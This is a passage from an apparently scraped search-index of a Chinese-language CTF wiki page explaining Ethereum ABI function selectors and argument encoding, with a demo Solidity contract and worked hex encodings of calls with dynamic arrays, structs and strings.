\u5206\u6790\u5b8c\u6bd5\uff0c\u6700\u540e\u5c31\u662f\u5176\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u8fdb\u884c encoding 0 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [[1,2],[3]] 1 - g // offset of [\"one\",\"two\",\"three\"] 2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [[1,2],[3]] 3 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [1,2] 4 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of [3] 5 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1,2] 6 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 1 7 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 2 8 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3] 9 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 3 10- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for [\"one\",\"two\",\"three\"] 11- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset for \"one\" 12- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset for \"two\" 13- 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset for \"three\" 14- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"one\" 15- 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of \"one\" 16- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"two\" 17- 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of \"two\" 18- 0x0000000000000000000000000000000000000000000000000000000000000005 // count for \"three\" 19- 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of \"three\" g \u6307\u5411\u5b57\u7b26\u4e32\u6570\u7ec4\u7684\u5f00\u59cb\uff0c\u6240\u4ee5 g=0x20*10=140 \u6240\u4ee5\u603b\u7684 selector + encoding \u5982\u4e0b\u6240\u793a 0xcc80bc65 // function selector 0 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [[1,2],[3]] 1 - 0x0000000000000000000000000000000000000000000000000000000000000140 // offset of [\"one\",\"two\",\"three\"] 2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [[1,2],[3]] 3 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [1,2] 4 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of [3] 5 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1,2] 6 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 1 7 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 2 8 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3] 9 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 3 10- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for [\"one\",\"two\",\"three\"] 11- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset for \"one\" 12- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset for \"two\" 13- 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset for \"three\" 14- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"one\" 15- 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of \"one\" 16- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"two\" 17- 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of \"two\" 18- 0x0000000000000000000000000000000000000000000000000000000000000005 // count for \"three\" 19- 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of \"three\" \u4f8b\u9898 \u00b6 balsn 2020 \u00b6 \u9898\u76ee\u540d\u79f0 Election Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"Function Selector and Argument Encoding"},{"location":"blockchain/ethereum/selector-encoding/#function-selector-and-argument-encoding","text":"\u8be6\u7ec6\u53ef\u67e5\u770b \u5b98\u65b9\u6587\u6863 \u53c2\u8003\u81ea\u5df1\u535a\u5ba2 Function Selector and Argument Encoding \u5728 Ethereum \u751f\u6001\u7cfb\u7edf\u4e2d\uff0cABI (Application Binary Interface\uff0c\u5e94\u7528\u4e8c\u8fdb\u5236\u63a5\u53e3) \u662f\u4ece\u533a\u5757\u94fe\u5916\u90e8\u4e0e\u5408\u7ea6\u8fdb\u884c\u4ea4\u4e92\u4ee5\u53ca\u5408\u7ea6\u4e0e\u5408\u7ea6\u95f4\u8fdb\u884c\u4ea4\u4e92\u7684\u4e00\u79cd\u6807\u51c6\u65b9\u5f0f\u3002\u6570\u636e\u4f1a\u6839\u636e\u5176\u7c7b\u578b\u6309\u7167\u8fd9\u4efd\u624b\u518c\u4e2d\u8bf4\u660e\u7684\u65b9\u6cd5\u8fdb\u884c\u7f16\u7801\u3002","title":"Function Selector and Argument Encoding"},{"location":"blockchain/ethereum/selector-encoding/#function-selector","text":"","title":"Function Selector"},{"location":"blockchain/ethereum/selector-encoding/#_1","text":"\u67d0\u4e2a\u51fd\u6570\u7b7e\u540d\u7684 Keccak (SHA-3) \u54c8\u5e0c\u7684\u524d 4 \u5b57\u8282\uff0c\u6307\u5b9a\u4e86\u8981\u8c03\u7528\u7684\u51fd\u6570\uff0c\u5f62\u5982 bytes4(keccak256('balanceOf(address)')) == 0x70a08231 \u8fd9\u79cd\u5f62\u5f0f\uff0c0x70a08231 \u4fbf\u662f balanceOf(address) \u7684 Function Selector \u57fa\u7840\u539f\u578b\u5373\u662f\u51fd\u6570\u540d\u79f0\u52a0\u4e0a\u7531\u62ec\u53f7\u62ec\u8d77\u6765\u7684\u53c2\u6570\u7c7b\u578b\u5217\u8868\uff0c\u53c2\u6570\u7c7b\u578b\u95f4\u7531\u4e00\u4e2a\u9017\u53f7\u5206\u9694\u5f00\uff0c\u4e14\u6ca1\u6709\u7a7a\u683c \u5bf9\u4e8e uint \u7c7b\u578b\uff0c\u8981\u8f6c\u6210 uint256 \u8fdb\u884c\u8ba1\u7b97\uff0c\u6bd4\u5982 ownerOf(uint256) \u5176 Function Selector = bytes4(keccak256('ownerOf(uint256)')) == 0x6352211e \u51fd\u6570\u53c2\u6570\u5305\u542b\u7ed3\u6784\u4f53\uff0c\u76f8\u5f53\u4e8e\u628a\u7ed3\u6784\u4f53\u62c6\u5206\u6210\u5355\u4e2a\u53c2\u6570\uff0c\u53ea\u4e0d\u8fc7\u8fd9\u4e9b\u53c2\u6570\u7528 () \u6269\u8d77\u6765\uff0c\u8be6\u7ec6\u53ef\u770b\u4e0b\u9762\u7684\u4f8b\u5b50","title":"\u539f\u7406"},{"location":"blockchain/ethereum/selector-encoding/#_2","text":"pragma solidity >= 0.4.16 < 0.9.0 ; pragma experimental ABIEncoderV2 ; contract Demo { struct Test { string name ; string policies ; uint num ; } uint public x ; function test1 ( bytes3 ) public { x = 1 ;} function test2 ( bytes3 [ 2 ] memory ) public { x = 1 ; } function test3 ( uint32 x , bool y ) public { x = 1 ; } function test4 ( uint , uint32 [] memory , bytes10 , bytes memory ) public { x = 1 ; } function test5 ( uint , Test memory test ) public { x = 1 ; } function test6 ( uint , Test [] memory tests ) public { x = 1 ; } function test7 ( uint [][] memory , string [] memory ) public { x = 1 ; } } /* \u51fd\u6570\u9009\u62e9\u5668 { \"0d2032f1\": \"test1(bytes3)\", \"2b231dad\": \"test2(bytes3[2])\", \"92e92919\": \"test3(uint32,bool)\", \"4d189ce2\": \"test4(uint256,uint32[],bytes10,bytes)\", \"4ca373dc\": \"test5(uint256,(string,string,uint256))\", \"ccc5bdd2\": \"test6(uint256,(string,string,uint256)[])\", \"cc80bc65\": \"test7(uint256[][],string[])\", \"0c55699c\": \"x()\" } */","title":"\u4f8b\u5b50"},{"location":"blockchain/ethereum/selector-encoding/#function-selector-and-argument-encoding_1","text":"","title":"Function Selector and Argument Encoding"},{"location":"blockchain/ethereum/selector-encoding/#_3","text":"\u52a8\u6001\u7c7b\u578b\u7684\u6570\u636e\uff0c\u6bd4\u5982\u52a8\u6001\u6570\u7ec4\uff0c\u7ed3\u6784\u4f53\uff0c\u53d8\u957f\u5b57\u8282\uff0c\u5176\u7f16\u7801\u540e\u5b58\u50a8\u5176 offset \u3001 length \u3001 data \u5148\u628a\u53c2\u6570\u987a\u5e8f\u5b58\u50a8\uff1a\u5982\u679c\u662f\u5b9a\u957f\u6570\u636e\u7c7b\u578b\uff0c\u76f4\u63a5\u5b58\u50a8\u5176 data \uff0c\u5982\u679c\u662f\u53d8\u957f\u6570\u636e\u7c7b\u578b\uff0c\u5148\u5b58\u50a8\u5176 offset \u987a\u5e8f\u904d\u5386\u53d8\u957f\u6570\u636e\uff1a\u5148\u5b58\u50a8 offset \uff0c\u5bf9\u4e8e\u7b2c\u4e00\u4e2a\u53d8\u957f\u6570\u636e\uff0c\u5148\u5b58\u50a8\u5176 offset = 0x20 * number ( number \u662f\u51fd\u6570\u53c2\u6570\u7684\u4e2a\u6570 )\uff1b\u5bf9\u4e8e\u4e0b\u4e00\u4e2a\u53d8\u957f\u6570\u636e\uff0c\u5176 offset = offset_of_prev + 0x20 + 0x20 * number (\u7b2c\u4e00\u4e2a 0x20 \u662f\u5b58\u50a8\u524d\u4e00\u4e2a\u53d8\u957f\u6570\u636e\u7684\u957f\u5ea6\u5360\u7528\u7684\u5927\u5c0f\uff0c number \u662f\u524d\u4e00\u4e2a\u53d8\u957f\u6570\u636e\u7684\u5143\u7d20\u4e2a\u6570) \u987a\u5e8f\u904d\u5386\u53d8\u957f\u6570\u636e\uff1a\u5b58\u50a8\u5b8c offset \uff0c\u63a5\u7740\u5c31\u662f\u904d\u5386\u6bcf\u4e2a\u53d8\u957f\u6570\u636e\uff0c\u5206\u522b\u5b58\u50a8\u5176 length \u548c data ( ps: \u5bf9\u4e8e\u7ed3\u6784\u4f53\u8fd9\u6837\u7684\u7c7b\u578b\uff0c\u5b58\u50a8\u7684\u65f6\u5019\u53ef\u628a\u7ed3\u6784\u4f53\u5185\u5143\u7d20\u770b\u6210\u662f\u4e00\u4e2a\u65b0\u51fd\u6570\u7684\u53c2\u6570\uff0c\u8fd9\u6837\u7684\u8bdd\uff0c\u5bf9\u4e8e\u7ed3\u6784\u4f53\u4e2d\u7684\u7b2c\u4e00\u4e2a\u53d8\u957f\u6570\u636e\uff0c\u5176 offset = 0x20 * num \uff0c num \u662f\u7ed3\u6784\u4f53\u5143\u7d20\u7684\u4e2a\u6570 )","title":"\u539f\u7406"},{"location":"blockchain/ethereum/selector-encoding/#_4","text":"\u9488\u5bf9\u4e0a\u8ff0\u7684\u5408\u7ea6\u4f8b\u5b50\u7684 7 \u4e2a\u51fd\u6570\uff0c\u5176\u51fd\u6570\u8c03\u7528\u6700\u7ec8\u7f16\u7801\u5982\u4e0b test1(\"0x112233\") 0x0d2032f1 // function selector 0 - 0x1122330000000000000000000000000000000000000000000000000000000000 // data of first parameter test2([\"0x112233\",\"0x445566\"]) 0x2b231dad // function selector 0 - 0x1122330000000000000000000000000000000000000000000000000000000000 // first data of first parameter 1 - 0x4455660000000000000000000000000000000000000000000000000000000000 // second data of first parameter test3(0x123,1) 0x92e92919 // function selector 0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter 1 - 0x0000000000000000000000000000000000000000000000000000000000000001 // data of second parameter test4(0x123,[\"0x11221122\",\"0x33443344\"],\"0x31323334353637383930\",\"0x3132333435\") 0x4d189ce2 // function selector 0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter 1 - 0x0000000000000000000000000000000000000000000000000000000000000080 // offset of second parameter 2 - 0x3132333435363738393000000000000000000000000000000000000000000000 // data of third parameter 3 - 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset of forth parameter 4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // length of second parameter 5 - 0x0000000000000000000000000000000000000000000000000000000011221122 // first data of second parameter 6 - 0x0000000000000000000000000000000000000000000000000000000033443344 // second data of second parameter 7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of forth parameter 8 - 0x3132333435000000000000000000000000000000000000000000000000000000 // data of forth parameter /* \u4e00\u4e9b\u89e3\u91ca\u8bf4\u660e data of first parameter: uint \u5b9a\u957f\u7c7b\u578b\uff0c\u76f4\u63a5\u5b58\u50a8\u5176 data offset of second parameter: uint32[] \u52a8\u6001\u6570\u7ec4\uff0c\u5148\u5b58\u50a8\u5176 offset=0x20*4 ( 4 \u4ee3\u8868\u51fd\u6570\u53c2\u6570\u7684\u4e2a\u6570 ) data of third parameter: bytes10 \u5b9a\u957f\u7c7b\u578b\uff0c\u76f4\u63a5\u5b58\u50a8\u5176 data offset of forth parameter: bytes \u53d8\u957f\u7c7b\u578b\uff0c\u5148\u5b58\u50a8\u5176 offset=0x80+0x20*3=0xe0 (0x80 \u662f\u524d\u4e00\u4e2a\u53d8\u957f\u7c7b\u578b\u7684 offset\uff0c3 \u662f\u524d\u4e00\u4e2a\u53d8\u957f\u7c7b\u578b\u5b58\u50a8\u5176\u957f\u5ea6\u548c\u4e24\u4e2a\u5143\u7d20\u5360\u7528\u7684\u63d2\u69fd\u4e2a\u6570) length of second parameter: \u5b58\u50a8\u5b8c data \u6216\u8005 offset \u540e\uff0c\u4fbf\u5f00\u59cb\u5b58\u50a8\u53d8\u957f\u6570\u636e\u7684 length \u548c data\uff0c\u8fd9\u91cc\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u957f\u5ea6 first data of second parameter: \u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u7b2c\u4e00\u4e2a\u6570\u636e second data of second parameter: \u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u7b2c\u4e8c\u4e2a\u6570\u636e length of forth parameter: \u4e0a\u9762\u5c31\u628a\u7b2c\u4e8c\u4e2a\u53d8\u957f\u6570\u636e\u5b58\u50a8\u5b8c\u6210\uff0c\u8fd9\u91cc\u5c31\u662f\u5b58\u50a8\u4e0b\u4e00\u4e2a\u53d8\u957f\u6570\u636e\u7684\u957f\u5ea6 data of forth parameter: \u7b2c\u56db\u4e2a\u53c2\u6570\u7684\u6570\u636e */ test5(0x123,[\"cxy\",\"pika\",123]) 0x4ca373dc // function selector 0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter 1 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of second parameter 2 - 0x0000000000000000000000000000000000000000000000000000000000000060 // first data offset of second parameter 3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // second data offset of second parameter 4 - 0x000000000000000000000000000000000000000000000000000000000000007b // third data of second parameter 5 - 0x0000000000000000000000000000000000000000000000000000000000000003 // first data length of second parameter 6 - 0x6378790000000000000000000000000000000000000000000000000000000000 // first data of second parameter 7 - 0x0000000000000000000000000000000000000000000000000000000000000004 // second data length of second parameter 8 - 0x70696b6100000000000000000000000000000000000000000000000000000000 // second data of second parameter /* \u4e00\u4e9b\u89e3\u91ca\u8bf4\u660e data of first parameter: uint \u5b9a\u957f\u7c7b\u578b\uff0c\u76f4\u63a5\u5b58\u50a8\u5176 data offset of second parameter: \u7ed3\u6784\u4f53\uff0c\u5148\u5b58\u50a8\u5176 offset=0x20*2 ( 2 \u4ee3\u8868\u51fd\u6570\u53c2\u6570\u7684\u4e2a\u6570) first data offset of second parameter: \u7ed3\u6784\u4f53\u5185\u5143\u7d20\u53ef\u5f53\u6210\u51fd\u6570\u53c2\u6570\u62c6\u5206\uff0c\u6709\u4e09\u4e2a\u5143\u7d20\uff0c\u56e0\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f string \u7c7b\u578b\uff0c\u6240\u4ee5\u5148\u5b58\u50a8\u5176 offset=0x20*3=0x60 second data offset of second parameter: \u7ed3\u6784\u4f53\u7b2c\u4e8c\u4e2a\u5143\u7d20\u662f string \u7c7b\u578b\uff0c\u5148\u5b58\u50a8\u5176 offset=0x60+0x20+0x20=0xa0 (\u7b2c\u4e00\u4e2a 0x20 \u662f\u5b58\u50a8\u7b2c\u4e00\u4e2a string \u7684\u957f\u5ea6\u6240\u5360\u5927\u5c0f\uff0c\u7b2c\u4e8c\u4e2a 0x20 \u662f\u5b58\u50a8\u7b2c\u4e00\u4e2a string \u7684\u6570\u636e\u6240\u5360\u5927\u5c0f) third data of second parameter: \u7ed3\u6784\u4f53\u7b2c\u4e09\u4e2a\u5143\u7d20\u662f uint \u5b9a\u957f\u7c7b\u578b\uff0c\u76f4\u63a5\u5b58\u50a8\u5176 data first data length of second parameter: \u5b58\u50a8\u7ed3\u6784\u4f53\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684 length first data of second parameter: \u5b58\u50a8\u7ed3\u6784\u4f53\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684 data second data length of second parameter: \u5b58\u50a8\u7ed3\u6784\u4f53\u7b2c\u4e8c\u4e2a\u5143\u7d20\u7684 length second data of second parameter: \u5b58\u50a8\u7ed3\u6784\u4f53\u7b2c\u4e8c\u4e2a\u5143\u7d20\u7684 data */ test6(0x123,[[\"cxy1\",\"pika1\",123], [\"cxy2\",\"pika2\",456]]) \u7531\u4e8e\u662f\u7ed3\u6784\u4f53\u6570\u7ec4\uff0c\u6240\u4ee5\u9700\u8981\u62c6\u5206\uff0c\u7531\u5185\u5411\u5916\u3002\u5185\u90e8\u662f\u4e24\u4e2a\u7ed3\u6784\u4f53\uff0c\u5206\u522b\u6765\u770b\u5176 encoding \u5bf9\u4e8e [\"cxy1\",\"pika1\",123] \u7ed3\u6784\u4f53\uff0c\u5176 encoding \u5982\u4e0b\uff08 \u76f4\u63a5\u5f53\u6210\u51fd\u6570\u53c2\u6570 encoding \uff09 0 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy1\" 1 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika1\" 2 - 0x000000000000000000000000000000000000000000000000000000000000007b // encoding of 123 3 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy1\" 4 - 0x6378793100000000000000000000000000000000000000000000000000000000 // encoding of \"cxy1\" 5 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika1\" 6 - 0x70696b6131000000000000000000000000000000000000000000000000000000 // encoding of \"pika1\" \u5bf9\u4e8e [\"cxy2\",\"pika2\",456] \u7ed3\u6784\u4f53\uff0c\u5176 encoding \u5982\u4e0b\uff08\u76f4\u63a5\u5f53\u6210\u51fd\u6570\u53c2\u6570 encoding \uff09 0 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy2\" 1 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika2\" 2 - 0x00000000000000000000000000000000000000000000000000000000000001c8 // encoding of 456 3 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy2\" 4 - 0x6378793200000000000000000000000000000000000000000000000000000000 // encoding of \"cxy2\" 5 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika2\" 6 - 0x70696b6132000000000000000000000000000000000000000000000000000000 // encoding of \"pika2\" \u7531\u4e8e\u662f\u7ed3\u6784\u4f53\uff0c\u6240\u4ee5\u8fd8\u9700\u8981 [\"cxy1\",\"pika1\",123] \u7684 offset \u548c [\"cxy2\",\"pika2\",456] \u7684 offset\uff0c\u5982\u4e0b 0 - a // offset of [\"cxy1\",\"pika1\",123] 1 - b // offset of [\"cxy2\",\"pika2\",456] 2 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy1\" 3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika1\" 4 - 0x000000000000000000000000000000000000000000000000000000000000007b // encoding of 123 5 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy1\" 6 - 0x6378793100000000000000000000000000000000000000000000000000000000 // encoding of \"cxy1\" 7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika1\" 8 - 0x70696b6131000000000000000000000000000000000000000000000000000000 // encoding of \"pika1\" 9 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy2\" 10- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika2\" 11- 0x00000000000000000000000000000000000000000000000000000000000001c8 // encoding of 456 12- 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy2\" 13- 0x6378793200000000000000000000000000000000000000000000000000000000 // encoding of \"cxy2\" 14- 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika2\" 15- 0x70696b6132000000000000000000000000000000000000000000000000000000 // encoding of \"pika2\" a\u6307\u5411 offset of \"cxy1\"\uff0c\u6240\u4ee5 a=0x20*2=0x40 b\u6307\u5411 offset of \"cxy2\"\uff0c\u6240\u4ee5 b=0x20*9=0x120 \u7531\u4e8e\u662f\u7ed3\u6784\u4f53\u6570\u7ec4\uff0c\u7ed3\u6784\u4f53\u5916\u9762\u662f\u6570\u7ec4\uff0c\u6240\u4ee5\u8981\u6309\u7167\u52a8\u6001\u6570\u7ec4encoding\u7684\u65b9\u6cd5\uff0c\u5982\u4e0b 0 - c // offset of [[\"cxy1\",\"pika1\",123],[\"cxy2\",\"pika2\",456]] 1 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count of second parameter 2 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [\"cxy1\",\"pika1\",\"1\"] 3 - 0x0000000000000000000000000000000000000000000000000000000000000120 // offset of [\"cxy2\",\"pika2\",\"1\"] 4 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy1\" 5 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika1\" 6 - 0x000000000000000000000000000000000000000000000000000000000000007b // encoding of 123 7 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy1\" 8 - 0x6378793100000000000000000000000000000000000000000000000000000000 // encoding of \"cxy1\" 9 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika1\" 10- 0x70696b6131000000000000000000000000000000000000000000000000000000 // encoding of \"pika1\" 11- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy2\" 12- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika2\" 13- 0x00000000000000000000000000000000000000000000000000000000000001c8 // encoding of 456 14- 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy2\" 15- 0x6378793200000000000000000000000000000000000000000000000000000000 // encoding of \"cxy2\" 16- 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika2\" 17- 0x70696b6132000000000000000000000000000000000000000000000000000000 // encoding of \"pika2\" c \u662f\u51fd\u6570\u53c2\u6570\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u662f\u52a8\u6001\u7c7b\u578b\uff0c\u6240\u4ee5 offset c = 0x20*2 = 0x40 \u6240\u4ee5\u603b\u7684 encoding \u5982\u4e0b 0xccc5bdd2 // function selector 0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // encoding of 0x123 1 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of second parameter 2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count of second parameter 3 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [\"cxy1\",\"pika1\",\"1\"] 4 - 0x0000000000000000000000000000000000000000000000000000000000000120 // offset of [\"cxy2\",\"pika2\",\"1\"] 5 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy1\" 6 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika1\" 7 - 0x000000000000000000000000000000000000000000000000000000000000007b // encoding of 123 8 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy1\" 9 - 0x6378793100000000000000000000000000000000000000000000000000000000 // encoding of \"cxy1\" 10- 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika1\" 11- 0x70696b6131000000000000000000000000000000000000000000000000000000 // encoding of \"pika1\" 12- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy2\" 13- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika2\" 14- 0x00000000000000000000000000000000000000000000000000000000000001c8 // encoding of 456 15- 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy2\" 16- 0x6378793200000000000000000000000000000000000000000000000000000000 // encoding of \"cxy2\" 17- 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika2\" 18- 0x70696b6132000000000000000000000000000000000000000000000000000000 // encoding of \"pika2\" test7([[1,2],[3]],[\"one\",\"two\",\"three\"]) \u540c\u7406\u8fdb\u884c\u7531\u5185\u5411\u5916\u7684\u62c6\u5206\uff0c\u9996\u5148\u662f [[1,2],[3]] \u52a8\u6001\u6570\u7ec4\u4e2d\u7684 [1, 2] \u548c [3] \u4e24\u4e2a\u52a8\u6001\u6570\u7ec4 0 - a // offset of [1,2] 1 - b // offset of [3] 2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1,2] 3 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 1 4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 2 5 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3] 6 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 3 a \u6307\u5411 [1,2] \u7684\u5f00\u59cb\uff0c\u6240\u4ee5 a=0x20*2=0x40 b \u6307\u5411 [3] \u7684\u5f00\u59cb\uff0c\u6240\u4ee5 b=0x20*5=0xa0 \u7136\u540e\u662f [[1,2],[3]] \u52a8\u6001\u6570\u7ec4\u672c\u8eab\u7684 encoding 0 - c // offset of [[1,2],[3]] 1 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [[1,2],[3]] 2 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [1,2] 3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of [3] 4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1,2] 5 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 1 6 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 2 7 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3] 8 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 3 c \u6307\u5411 [[1,2],[3]] \u7684\u5f00\u59cb\uff0c\u6240\u4ee5 a=0x20*2=0x40 \u5176\u6b21\u662f [\"one\",\"two\",\"three\"] \u52a8\u6001\u6570\u7ec4\u4e2d\u6bcf\u4e2a string \u7684 encoding 0 - d // offset for \"one\" 1 - e // offset for \"two\" 2 - f // offset for \"three\" 3 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"one\" 4 - 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of \"one\" 5 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"two\" 6 - 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of \"two\" 7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // count for \"three\" 8 - 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of \"three\" d \u6307\u5411 \u201cone\u201d \u7684\u5f00\u59cb\uff0c\u6240\u4ee5 d=0x20*3=0x60 e \u6307\u5411 \u201ctwo\u201d \u7684\u5f00\u59cb\uff0c\u6240\u4ee5 e=0x20*5=0xa0 f \u6307\u5411 \u201cthree\u201d \u7684\u5f00\u59cb\uff0c\u6240\u4ee5 f=0x20*7=0xe0 \u7136\u540e\u662f [\"one\",\"two\",\"three\"] \u52a8\u6001\u6570\u7ec4\u672c\u8eab\u7684 encoding 0 - g // offset of [\"one\",\"two\",\"three\"] 1 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for [\"one\",\"two\",\"three\"] 2 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset for \"one\" 3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset for \"two\" 4 - 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset for \"three\" 5 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"one\" 6 - 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of \"one\" 7 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"two\" 8 - 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of \"two\" 9 - 0x0000000000000000000000000000000000000000000000000000000000000005 // count for \"three\" 10- 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of \"three\" \u8fd9\u91cc g \u5148\u4e0d\u8fdb\u884c\u8ba1\u7b97\uff0c\u56e0\u4e3a\u6d89\u53ca\u5230\u51fd\u6570\u53c2\u6570\u6574\u4f53\u7684\u4e00\u4e2a encoding \u4e0a\u9762\u5c31\u5df2\u7ecf\u628a\u6700\u540e\u5c31\u662f [[1,2],[3]] \u548c [\"one\",\"two\",\"three\"] \u5206\u6790\u5b8c\u6bd5\uff0c\u6700\u540e\u5c31\u662f\u5176\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u8fdb\u884c encoding 0 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [[1,2],[3]] 1 - g // offset of [\"one\",\"two\",\"three\"] 2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [[1,2],[3]] 3 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [1,2] 4 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of [3] 5 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1,2] 6 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 1 7 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 2 8 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3] 9 - 0x0000000000000000000000000000000000000000000000000000000000000003 // 